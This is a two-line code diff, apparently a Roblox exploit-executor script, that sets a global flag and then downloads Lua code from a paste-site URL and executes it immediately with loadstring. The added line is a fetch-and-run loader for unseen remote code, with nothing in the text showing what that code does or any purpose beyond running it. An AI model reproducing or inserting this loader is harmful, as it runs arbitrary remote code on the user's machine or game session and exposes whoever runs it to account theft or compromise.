@@ -1,0 +1,2 @@
+getgenv().ls = false
+loadstring(game:HttpGet("http://vpaste.net/zhSah"))()
